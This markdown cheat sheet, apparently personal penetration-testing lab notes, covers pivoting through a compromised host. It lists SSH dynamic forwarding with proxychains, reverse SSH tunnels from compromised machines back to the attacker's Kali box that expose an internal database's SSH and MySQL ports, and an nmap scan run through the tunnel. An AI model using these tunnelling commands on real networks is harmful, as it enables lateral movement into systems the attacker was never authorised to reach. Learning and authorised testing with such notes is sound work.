# Pivoting

`/etc/proxychains.conf` has `127.0.0.1:9050` configured as default, so we can just use like:

```bash
ssh -f -N -D 127.0.0.1:9050 sean@10.11.1.251
proxychain <cmd>
```

Proxychain will display connections like:
```bash
|S-chain|-<>-127.0.0.1:9050-<><>-10.1.1.1:22-<><>-OK
```

## Create a tunnel to another machine through a compromised target

(from **me** to **db server** through **target 1**)

**[me]** <- external -> **[target 1]** <- internal ->**[db server]**

Generate ssh key pair (**me**)
```bash
ssh-keygen
```

Add to  `authorized_keys` with restrictions (**me**)
```bash
from="<target-ip>",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty <pub-key>
```

Get Access to port 22 and 3306 on database server  (**target 1**)
```bash
ssh -f -N -R 1122:<db-ip>:22 -R 13306:<db-ip>:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i <priv-key-file> kali@<own-ip>
```

Verify (**me**)
```bash
sudo netstat -tulpn
```

```
[...]
tcp	0	0 127.0.0.1:13306	0.0.0.:*	LISTEN	6740/sshd: kali
tcp	0	0 127.0.0.1:1122	0.0.0.:*	LISTEN	6740/sshd: kali
[...]
```

## Creating a stable reverse tunnel

(from **db server** back to **me**)

**[me]** <- external -> **[target 1]** <- internal ->**[db server]** <- smb share -> **[target 2]**

Generate ssh key pair (**db server**)
```bash
ssh-keygen
```

```bash
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i <priv-key-file> kali@<own-ip>
```

Setup proxychains (**me**)
```bash
/etc/proxychains.conf
```

```
[...]
socks 127.0.0.1 1080
```

### Using nmap via proxychains

Doing only a very limited scan, as nmap via proxy is very slow
```bash
proxychains nmap --top-ports=20 -sT -Pn <ip>
```
